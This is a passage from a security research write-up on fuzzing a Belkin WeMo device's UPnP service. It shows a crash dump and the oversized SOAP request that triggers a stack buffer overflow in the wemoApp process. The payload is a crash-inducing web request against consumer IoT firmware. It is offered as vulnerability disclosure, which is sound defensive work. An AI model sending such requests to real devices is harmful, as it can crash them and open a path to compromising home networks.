
PrId : 0001964c
Modules linked in: softdog rt_rdm rt2860v2_ap(P) raeth Process wemoApp (pid: 2157, threadinfo=80fa0000, task=802c87f0)
Stack : 2a0000d0 fffffffe 31d2e6f0 31d2e770 31d2e76f 31d2e6f0 31d2e6f0 31d2e770 00000000 31d2e604 00000000 00000000 2ac77d40 00000000 4f464751 4a484d4c 4e444241 47454f49 50464658 45414d42 43445044 464d4945 5552414c 46495048
4b524141 41445a4f 44534e4a 4e4e494c 44434357 494a4855 44515455 44494b45 55584a44 584e4f52 545a5247 51545954 595a4c42 4e594a45 484f5158 46474944 … Call Trace: Code: 80a20000 50480004
a0600000 <5440fffa> a0620000 a0600000 10a00006 24840004 24a50001 thready: Destructor freeing name “ChildFDTask”.
Aborted After repeating and closely observing the experiment several times, we determined that the crash was caused by the following packet: POST /upnp/control/basicevent1 HTTP/1.1 Host: 192.168.225.183:49154 User-Agent: python-requests/2.9.1 Accept: */* Connection: keep-alive SOAPAction: “urn:Belkin:service:basicevent:1#UpdateInsightHomeSettings” Content-Type: text/xml Accept-Encoding: gzip, deflate Content-Length: 3253 <?
xml version=”1.0″ ?
><s:
Envelope s:encodingStyle=”http://schemas.xmlsoap.org/soap/encoding/” xmlns:
s=”http://schemas.xmlsoap.org/soap/envelope/”><s:Body><b1ack0wl_ns:UpdateInsightHomeSettingsxmlns:b1ack0wl_ns=”urn:Belkin:service:basicevent:1″><EnergyPerUnitCost>210</EnergyPerUnitCost><Currency>236</Currency><EnergyPerUnitCostVersion>KWWZWIVYBQZKDGSSAAPBCQVQQFAVYZEOEUFIDXXQPDYGESTOD
GIJFERXZNMYAFJQLUZPSIJXFQSPADCRIVHDAJLLPQMPLAVECIQUWLXDLIGPLBKCROGPOCVUI
KTSLIIXULOEBVFKWIERCFGHWHCBBDLWFBKBZXAVGRKTDALDNRPOFQJDXAEOC(…snip…)XHU
OUZPCHUBFGLLWSJBFYFOMCGZZMJIQIUVCDETFBRBZVDVKNBVZFBRSVBSZPAYKZYNQZEQPDV DWSZNDUPUDCPAVWNFBFBTYMXTBNCWTBJPKORUBHBSCQBPOPOBZNVADMGWRI </EnergyPerUnitCostVersion></b1ack0wl_ns:UpdateInsightHomeSettings></s:Body></s:
Envelope>
For space reasons some of the payload has been removed.
(The original data in “EnergyPerUnitCostVersion” was 2,828 characters.)
After examining the crash data and the packet, this appears to be a standard buffer overflow, in which data is being overwritten onto the stack.
We continued fuzzing, now focused on the “EnergyPerUnitCost” field and found we needed only 32 characters to crash the application.